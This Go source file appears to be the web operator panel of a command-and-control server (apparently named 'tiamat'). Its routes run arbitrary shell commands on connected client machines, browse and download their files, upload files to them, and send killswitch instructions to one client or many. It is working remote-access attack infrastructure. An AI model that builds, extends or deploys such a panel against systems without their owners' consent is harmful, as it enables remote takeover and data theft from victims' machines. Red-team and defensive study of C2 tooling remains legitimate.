package cmd

import (
	"embed"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/spf13/viper"
)

var (
	WebPort string = "8080"
)

//go:embed templates/*
var templatesFolder embed.FS

func WebServer() {
	p := viper.GetString("Server.WebPort")
	if p != "" {
		WebPort = p
	}
	gin.SetMode(gin.ReleaseMode)
	r := gin.Default()
	LoadHTMLFromEmbedFS(r, templatesFolder, "templates/*.html")
	r.StaticFileFS("/style.css", "./templates/style.css", http.FS(templatesFolder))
	r.StaticFileFS("/htmx.js", "./templates/htmx.js", http.FS(templatesFolder))
	setFavicons(r)

	r.GET("/", getRoot)
	r.GET("/command/:clientid", getCommands)
	r.GET("/fs/:clientid", getFilesystem)
	r.POST("/ls/:clientid", listFiles)
	r.POST("/upload/:clientid", uploadFile)
	r.GET("/download/:clientid/:file", downloadFile)
	r.POST("/command/:clientid", execCMD)
	r.POST("/kill/:clientid", sendKillswitch)
	r.GET("/dump", dumpClients)
	r.POST("/save", saveClients)
	r.POST("/remove/:clientid", removeClient)
	r.POST("/bulk-kill", bulkKill)
	r.POST("/bulk-remove/", bulkRemove)

	// Start
	r.Run(":" + WebPort)
}

func downloadFile(c *gin.Context) {
	client, err := clientCheck(c)
	if err != nil {
		return
	}

	file := c.Param("file")
	if file == "" {
		return
	}
	path := strings.Replace(file, "_|_", "/", -1)

	resp, err := downloadFileC2(client, path)
	if err != nil {
		e := fmt.Sprintf("Error happened executing command: %v\n", err)
		c.String(http.StatusOK, e)
		return
	}
	if resp.Successful != true {
		e := fmt.Sprintf("Error happened executing command: %v\n", resp.Message)
		c.String(http.StatusOK, e)
		return
	}

	os.WriteFile("/tmp/tiamat/"+resp.FileName, resp.FileContents, 0700)

	c.FileAttachment("/tmp/tiamat/"+resp.FileName, resp.FileName)
}

func clientCheck(c *gin.Context) (Client, error) {
	id := c.Param("clientid")
	idInt, err := strconv.Atoi(id)
	if err != nil {
		c.String(http.StatusInternalServerError, "Error happened, please make this a proper error later")
		return Client{}, err
	}

	client, _, err := returnClient(idInt)
	if err != nil {
		return Client{}, err
	}

	if client.IsOnline == false {
		c.String(http.StatusOK, "Client is currently offline!")
		return Client{}, err
	}

	return *client, nil
}

func uploadFile(c *gin.Context) {
	client, err := clientCheck(c)
	if err != nil {
		return
	}

	path, _ := c.GetPostForm("cmd")
	file, err := c.FormFile("fileToUpload")
	if err != nil {
		log.Println(err)
	}

	resp, err := uploadFileC2(client, *file, path)
	if err != nil {
		e := fmt.Sprintf("Error happened executing command: %v\n", err)
		c.String(http.StatusOK, e)
		return
	}
	if resp.Successful != true {
		e := fmt.Sprintf("Error happened executing command: %v\n", resp.Message)
		c.String(http.StatusOK, e)
		return
	}
	listFiles(c)
}

func listFiles(c *gin.Context) {
	client, err := clientCheck(c)
	if err != nil {
		return
	}

	path, _ := c.GetPostForm("cmd")
	var list string

	uploadSection := fmt.Sprintf(`<form hx-post="/upload/%v" hx-encoding='multipart/form-data' id="uploader" hx-vals='{ "cmd": "%v" }' hx-target="#files">
        <input type="file" name="fileToUpload" value="Upload file?" required>
        <button id="but">
          Upload
        </button>
  			<progress id="progress" value="0" max="100">Upload progress:</progress>
      </form>
      <script>
        htmx.on('#form', 'htmx:xhr:progress', function (evt) {
          htmx.find('#progress').setattribute('value', evt.detail.loaded / evt.detail.total * 100)
        });
      </script>`, client.ClientID, path)
	list += uploadSection

	currentLocation := fmt.Sprintf("Current location: %v<br>", path)
	list += currentLocation

	split := strings.Split(path, "/")
	parentFolder := strings.Join(split[:len(split)-1], "/")
	if parentFolder == "" {
		parentFolder = "/"
	}

	parentFolderLink := fmt.Sprintf("<a hx-post=\"/ls/%v\" hx-target=\"#files\" hx-vals='{\"cmd\": \"%v\"}' id=\"pointer\">../</a><br>",
		client.ClientID, parentFolder)
	list += parentFolderLink

	resp, err := requestFiles(client, path)
	if err != nil {
		e := fmt.Sprintf("Error happened executing command: %v\n", err)
		list += e
		c.String(http.StatusOK, list)
		return
	}
	if resp.Successful != true {
		e := fmt.Sprintf("Error happened executing command: %v\n", resp.Message)
		list += e
		c.String(http.StatusOK, list)
		return
	}

	for _, v := range resp.FileList.File {
		if v.IsFolder == true {
			entry := fmt.Sprintf("<a hx-post=\"/ls/%v\" hx-target=\"#files\" hx-vals='{\"cmd\": \"%v\"}' id=\"pointer\">[d] %v/</a><br>",
				client.ClientID, v.FullPath, v.Name)
			list += entry
		} else {
			entry := fmt.Sprintf("<a target=\"_blank\" href=\"/download/%v/%v\" id=\"pointer\">%v</a><br>",
				client.ClientID, strings.Replace(v.FullPath, "/", "_|_", -1), v.Name)
			list += entry
		}
	}
	c.String(http.StatusOK, list)

}

func bulkKill(c *gin.Context) {
	list := Bulk{}
	c.ShouldBind(&list)
	if len(list.ClientIDs) == 0 {
		return
	}
	for _, v := range list.ClientIDs {
		genericKillswitch(v)
	}
}

func bulkRemove(c *gin.Context) {
	list := Bulk{}
	c.ShouldBind(&list)
	if len(list.ClientIDs) == 0 {
		return
	}
	for _, v := range list.ClientIDs {
		genericRemoveClient(v)
	}
}

func dumpClients(c *gin.Context) {
	jsonClients := marshalClients()
	c.IndentedJSON(http.StatusOK, jsonClients)
}

func saveClients(c *gin.Context) {
	log.Println("Saving clients...")
	jsonClients := marshalClients()
	fileToSaveTo, err := setClientPath()
	if err != nil {
		log.Print(err)
		return
	}

	f, err := os.Create(fileToSaveTo)
	if err != nil {
		log.Print(err)
		return
	}
	defer f.Close()
	as_json, _ := json.MarshalIndent(jsonClients, "", "\t")
	f.Write(as_json)
	log.Println("Success!")
}

func removeClient(c *gin.Context) {
	clientID := c.Param("clientid")
	intClientID, err := strconv.Atoi(clientID)
	if err != nil {
		c.String(http.StatusInternalServerError, "Error happened fetching client: %v", err)
		return
	}
	genericRemoveClient(intClientID)
}

func genericRemoveClient(id int) {
	client, id, err := returnClient(id)
	if err != nil {
		return
	}

	if client.IsOnline == true {
		client.Instruct(Instructions{
			IsKillswitch: true,
		})
	}

	log.Printf("Removing client %v\n", id)
	if len(clientList) != 1 {
		clientList = append(clientList[:id], clientList[id+1:]...)
	} else {
		clientList = nil
	}
	log.Printf("Success!")
}

func marshalClients() ClientJSON {
	jsonClients := ClientJSON{Date: time.Now()}
	for _, v := range clientList {
		jsonClients.List = append(jsonClients.List, v.ClientBasicInfo)
	}
	return jsonClients
}

func getRoot(c *gin.Context) {
	c.HTML(http.StatusOK, "templates/index.html", gin.H{
		"Clients": clientList,
	})
}

func getCommands(c *gin.Context) {
	clientID := c.Param("clientid")
	intClientID, err := strconv.Atoi(clientID)
	if err != nil {
		c.String(http.StatusInternalServerError, "Error happened fetching client: %v", err)
		return
	}
	client, _, err := returnClient(intClientID)
	if err != nil {
		c.String(http.StatusNotFound, "Client not found")
		return
	}
	c.HTML(http.StatusOK, "templates/command.html", gin.H{
		"Client": client,
	})
}

func getFilesystem(c *gin.Context) {
	clientID := c.Param("clientid")
	intClientID, err := strconv.Atoi(clientID)
	if err != nil {
		c.String(http.StatusInternalServerError, "Error happened fetching client: %v", err)
		return
	}
	client, _, err := returnClient(intClientID)
	if err != nil {
		c.String(http.StatusNotFound, "Client not found")
		return
	}
	c.HTML(http.StatusOK, "templates/fs.html", gin.H{
		"Client": client,
	})
}

func sendKillswitch(c *gin.Context) {
	clientID := c.Param("clientid")
	intClientID, err := strconv.Atoi(clientID)
	if err != nil {
		c.String(http.StatusInternalServerError, "Error happened fetching client: %v", err)
		return
	}
	genericKillswitch(intClientID)
}

func genericKillswitch(id int) {
	_, id, err := returnClient(id)
	if err != nil {
		return
	}

	if clientList[id].IsOnline == false {
		return
	}

	inst := Instructions{
		IsKillswitch: true,
	}
	clientList[id].Instruct(inst)
	clientList[id].IsOnline = false
}

func execCMD(c *gin.Context) {
	id := c.Param("clientid")
	idInt, err := strconv.Atoi(id)
	if err != nil {
		c.String(http.StatusInternalServerError, "Error happened, please make this a proper error later")
		return
	}

	client, _, err := returnClient(idInt)
	if err != nil {
		return
	}

	if client.IsOnline == false {
		c.String(http.StatusOK, "Client is currently offline!")
		return
	}

	command, _ := c.GetPostForm("cmd")

	out, err := sendCommand(*client, command)
	if err != nil {
		e := fmt.Sprintf("Error happened executing command: %v\n", err)
		c.String(http.StatusOK, e)
		return
	}
	prettyOut := strings.Replace(out, "\n", "<br>", -1)
	c.String(http.StatusOK, "$ "+command+"<br>"+prettyOut)
}

func setFavicons(r *gin.Engine) {
	r.StaticFileFS("/favicon.ico", "./templates/assets/favicon.ico", http.FS(templatesFolder))
	r.StaticFileFS("/favicon-32x32.png", "./templates/assets/favicon-32x32.png", http.FS(templatesFolder))
	r.StaticFileFS("/favicon-16x16.png", "./templates/assets/favicon-16x16.png", http.FS(templatesFolder))
	r.StaticFileFS("/apple-touch-icon.png", "./templates/assets/apple-touch-icon.png", http.FS(templatesFolder))
	r.StaticFileFS("/android-chrome-512x512.png", "./templates/assets/android-chrome-512x512.png", http.FS(templatesFolder))
	r.StaticFileFS("/android-chrome-192x192.png", "./templates/assets/android-chrome-192x192.png", http.FS(templatesFolder))
	r.StaticFileFS("/site.webmanifest", "./templates/assets/site.webmanifest", http.FS(templatesFolder))
}
